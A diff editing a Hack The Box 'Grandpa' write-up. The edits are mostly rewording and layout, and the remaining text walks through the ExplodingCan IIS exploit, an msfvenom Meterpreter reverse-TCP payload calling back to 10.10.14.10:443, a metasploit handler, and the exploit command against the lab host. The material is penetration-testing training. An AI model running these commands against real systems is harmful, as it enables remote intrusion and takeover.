@@ -169,11 +169,12 @@ It is well worth a read!
 
 Searching again on Google for more info, using the exploit's name `ExplodingCan`, I found [another script](https://github.com/danigargu/explodingcan).
 
-So we now have two versions of essentially the same exploit. We can try them both!
+So we now have two versions of essentially the same exploit. We can look at them both!
 
 
 
-`searchsploit -m 41738` will copy the first exploit to the pwd (present working directory)
+`searchsploit -m 41738` will copy the first exploit to the pwd (present working directory) and have a closer look.
+
 
 ```
 
@@ -187,15 +188,25 @@ Copied to: /root/HTB/vip/grandpa/41738.py
 
 ```
 
+<hr width="250" size="6">
 
-<h4>MSFVenom</h4>
+
+
+The Second exploit looks more simple to impliment than the first, I copy it from github as
+ explodingcan.py, and generate a `shellcode` file with msfvenom.
+
+
+<hr width="250" size="6">
+
+
+
+
+<h4>MsfVenom, Meterpreter + Multi/Handler</h4>
 
 ```
 msfvenom -p windows/meterpreter/reverse_tcp -f raw -v sc -e x86/alpha_mixed LHOST=10.10.14.10 LPORT=443 | tee shellcode
 ```
 
-
-copypaste the shellcode to replace the 'poppin-calc' shellcode of the first exploit.
 
 Fire up metasploit
 
@@ -204,7 +215,9 @@ service postgresql start
 msfconsole
 ```
 
-Because we used a staged meterpreter payload, we'll need to use the exploit/multi/handler.
+Because we used a staged meterpreter payload, we'll need to use the 
+exploit/multi/handler.
+
 
 ```
 
@@ -222,11 +235,10 @@ msf5 exploit(multi/handler) > exploit
 ```
 
 
-The first exploit didn't work straight away, so a bit more fiddling may be required; so I take a look at the second.
+<hr width="250" size="6">
 
-I copy it from github as explodingcan.py, and read it.
 
-I had used the msfvenom command to produce the file `shellcode`, so the required command to run it is
+With everything ready, we execute the exploit with the following command:
 
 `python explodingcan.py http://10.10.10.14 shellcode`
 
@@ -236,10 +248,13 @@ I had used the msfvenom command to produce the file `shellcode`, so the required
 ![meterpreter](/assets/img/grandpa/gp-meterpreter1.png)
 
 
+<hr width="250" size="6">
+
 
 <h3>Privilege Escalation</h3>
 
-So we've got a meterpreter shell. The second [exploit](https://github.com/danigargu/explodingcan/blob/master/explodingcan.py) was straight-forward to impliment. 
+So we've got a meterpreter shell. The second [exploit](https://github.com/danigargu/explodingcan/blob/master/explodingcan.py)
+ was straight-forward to impliment. 
 
 We need to background the session and look for a path to privilege-escalation.
 
